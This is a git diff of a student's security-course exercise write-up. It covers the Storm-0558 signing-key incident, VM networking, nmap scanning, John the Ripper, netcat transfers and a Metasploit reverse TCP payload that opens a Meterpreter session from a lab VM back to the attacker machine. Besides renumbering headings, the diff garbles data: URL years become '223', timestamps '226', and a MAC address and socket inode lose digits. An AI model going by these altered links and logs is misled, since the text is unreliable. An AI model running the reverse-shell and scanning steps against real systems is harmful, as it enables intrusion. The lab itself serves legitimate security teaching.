@@ -1,17 +1,15 @@
 # Exercise 02: Starting the Journey
 
-## 02.a 
+## 2.a 
 
-### 02.a.1 How did they separate access & infrastructure according to data relevance & impact?
-
+### 2.a.1 How did they separate access & infrastructure according to data relevance & impact?
 To accomplish this, Microsoft made a distinction between two environments. On one hand, they isolated the very high impact (and data relevance) production environment, closing off collaboration tools such as email, web browsers and conference tools from external network traffic; they also took security measures like providing dedicated accounts for admin work, Just In Time + Just Enough Access models and, importantly, the policy to never allow secret keys (or whatever cryptographic material) to leave the premise.
 
 On the other hand, the corporate environment would be provisioned with the standard collaboration tools to ensure a natural workflow; the key to securing this scene is to apply the zero trust model, meaning the workstations must be assummed as compromised because of their vulnerable nature. It was withing this high surface of impact zone that a debugging environment sat in and captured the private signing key from a crash dump due to a race condition.
 
 Having addressed access distinctions, the separation of infrastructure is straightforward, but with a crucial flaw. Signing keys architecturally intended to separate two concerns: the consumer (MSA keys) and the enterprise (Azure AD keys). The assumption that consumer-signed tokens wouldn't be accepted in enterprise mailboxes was breached by the fact that, due to cryptographic helper libraries verified the digital signature of the private keys against public keys without validating the scope of the key, fundamentally breaking the contract.
 
-### 02.a.2 How do roles and personnel fit into this, and which role could policies and training play?
-
+### 2.a.2 How do roles and personnel fit into this, and which role could policies and training play?
 When looking into the roles that human agents played in this event we have to first point out the one that made the attack possible, and that's the operator in the corporate environment that likely fell victim to a phishing (or perhaps social engineering) attack which resulted in the corporate debugging repository access being leaked (and captured by Storm). Besides, we have the engineers who were working in the endpoint and assummed the helper cryptographic libraries to also validate scope of the issued tokens (probably some confusion between business logic and authorization as part of the system).
 
 As for the roles, we must first address that of the policies. Firstly, policies must explicitly classify memory crash dumps and core dumps as containing sensitive memory, inspection which Microsoft states to have enforced since then; the latter should be paired with credential scanning before any file transitions as part of ingestion policies; ideally, Just In Time + Just Enough Access should be applied to all engineers that pretend to access any relevant data, though it is true that this introduces friction; finally log retention policies should prevent cases like this one, in which definitive proof that this engineer's account was the backdoor is nowhere to be found.
@@ -19,13 +17,13 @@ As for the roles, we must first address that of the policies. Firstly, policies 
 Additionally, as for the training role, developers will need introduced (hands-on) to OAuth lifecycles so they can distinguish verifying signature integrity apart from checking the issuer (iss) and the audience (aud). Also, regarding safe practices around data sanitization and debugging, the operators need to recognize that race conditions often can leak secrets and personnel must treat memory snapshots as secret material rather than typical logs. Plus, anti-phishing adequation and training are a must so they can identify such attack vectors (those that have usual access to critical tools would especially benefit from such training).
 
 ### Useful links
-$\rightarrow$ [MS Mitigates](https://www.microsoft.com/en-us/msrc/blog/2023/07/microsoft-mitigates-china-based-threat-actor-storm-0558-targeting-of-customer-email)
-$\rightarrow$ [MS On The Issues](https://blogs.microsoft.com/on-the-issues/2023/07/11/mitigation-china-based-threat-actor/)
-$\rightarrow$ [Results of Major Investigations](https://www.microsoft.com/en-us/msrc/blog/2023/09/results-of-major-technical-investigations-for-storm-0558-key-acquisition)
+$\rightarrow$ [MS Mitigates](https://www.microsoft.com/en-us/msrc/blog/223/07/microsoft-mitigates-china-based-threat-actor-storm-0558-targeting-of-customer-email)
+$\rightarrow$ [MS On The Issues](https://blogs.microsoft.com/on-the-issues/223/07/11/mitigation-china-based-threat-actor/)
+$\rightarrow$ [Results of Major Investigations](https://www.microsoft.com/en-us/msrc/blog/223/09/results-of-major-technical-investigations-for-storm-0558-key-acquisition)
 
-## 02.b 
+## 2.b 
 
-### 02.b.1 **Networking options** 
+### 2.b.1 **Networking options** 
 > Write down the explanation for:
 > - Network Address Translation
 > - NAT Network
@@ -40,7 +38,7 @@ $\rightarrow$ [Results of Major Investigations](https://www.microsoft.com/en-us/
 
 `Host only`: the virtual machine will be assigned an IP address, but it can't communicate with any other device.
 
-### 02.b.2 **VM ip address**
+### 2.b.2 **VM ip address**
 > 1. Which command would you use to get the IP in Linux?
 > 2. Which command would you use to the the IP in Windows? 
 > 3. Inspect the whole network configuration of the Linux Metasploitable VM, i.e., interfaces, ip addresses, routes.
@@ -81,7 +79,7 @@ vagrant@ubuntu:~$ ip address show
     inet6 fe80::a00:27ff:fe42:5179/64 scope link 
        valid_lft forever preferred_lft forever
 3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
-    link/ether 02:42:d7:c0:80:e0 brd ff:ff:ff:ff:ff:ff
+    link/ether 2:42:d7:c0:80:e0 brd ff:ff:ff:ff:ff:ff
     inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
        valid_lft forever preferred_lft forever
     inet6 fe80::42:d7ff:fec0:80e0/64 scope link 
@@ -126,8 +124,7 @@ Again, the information are provided in the following order:
 
 > Note: from this type of information we can get the local ip address of the device.
 
-### 02.b.3 **Testing the Tools Presented in Class**
-
+### 2.b.3 **Testing the Tools Presented in Class**
 > As warm up, please got through the slides and test out commands provided. At least, look into:
 > - Using `John the Ripper` to brute-force Kali's password database. Make
 things more interesting by changing your password with the `passwd` command.
@@ -169,7 +166,7 @@ unix  3      [ ]         STREAM     CONNECTED     14395
 unix  3      [ ]         STREAM     CONNECTED     10314    /run/user/1000/pipewire-0-manager
 unix  2      [ ]         DGRAM      CONNECTED     9832     
 unix  2      [ ]         DGRAM      CONNECTED     6603     
-unix  3      [ ]         STREAM     CONNECTED     11029    /run/user/1000/at-spi/bus_0
+unix  3      [ ]         STREAM     CONNECTED     1129    /run/user/1000/at-spi/bus_0
 unix  3      [ ]         STREAM     CONNECTED     6272     /run/systemd/journal/stdout
 unix  3      [ ]         STREAM     CONNECTED     15496    /run/dbus/system_bus_socket
 ...
@@ -232,7 +229,7 @@ We take in account the IP address `10.0.2.4` with its subnet mask, and finally w
 
 ```bash
 kali㉿kali$ nmap -sP 10.0.2.4/24
-Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-16 04:35 -0400
+Starting Nmap 7.99 ( https://nmap.org ) at 226-09-16 04:35 -0400
 Nmap scan report for 10.0.2.1
 Host is up (0.00044s latency).
 MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
@@ -341,7 +338,7 @@ vagrant@ubuntu$ netcat 10.0.2.4 8080 > test_1.txt
 
 At the end, Metasploitable virtual machine will receive `test_1.txt` sent by Kali virtual machine, saving it inside its own system.
 
-### 02.b.4 **Simulating remote access**
+### 2.b.4 **Simulating remote access**
 > For this tutorial, we will use the metasplot framework, which provides a large
 > collection of payloads (for actions to be taken) and exploits (for transmitting
 > the payloads) amongst many other tools. The tutorial is about the payload, not about a hacking-process leading to the deployment of the payload. Therefore, we apply the following steps.
@@ -417,7 +414,7 @@ vagrant@ubuntu$ ./payload.elf
 msf exploit(multi/handler) > run
 [*] Started reverse TCP handler on 10.0.2.4:8080 
 [*] Sending stage (1079144 bytes) to 10.0.2.15
-[*] Meterpreter session 1 opened (10.0.2.4:8080 -> 10.0.2.15:42609) at 2026-09-17 10:34:18 -0400
+[*] Meterpreter session 1 opened (10.0.2.4:8080 -> 10.0.2.15:42609) at 226-09-17 10:34:18 -0400
 
 meterpreter > 
 ```
@@ -428,7 +425,7 @@ The connection is established, the attacker's machine can access to different in
 msf exploit(multi/handler) > run
 [*] Started reverse TCP handler on 10.0.2.4:8080 
 [*] Sending stage (1079144 bytes) to 10.0.2.15
-[*] Meterpreter session 1 opened (10.0.2.4:8080 -> 10.0.2.15:42609) at 2026-09-17 10:34:18 -0400
+[*] Meterpreter session 1 opened (10.0.2.4:8080 -> 10.0.2.15:42609) at 226-09-17 10:34:18 -0400
 
 meterpreter > getuid 
 Server username: vagrant
@@ -439,7 +436,7 @@ meterpreter >
 msf exploit(multi/handler) > run
 [*] Started reverse TCP handler on 10.0.2.4:8080 
 [*] Sending stage (1079144 bytes) to 10.0.2.15
-[*] Meterpreter session 1 opened (10.0.2.4:8080 -> 10.0.2.15:42609) at 2026-09-17 10:34:18 -0400
+[*] Meterpreter session 1 opened (10.0.2.4:8080 -> 10.0.2.15:42609) at 226-09-17 10:34:18 -0400
 
 meterpreter > getuid 
 Server username: vagrant
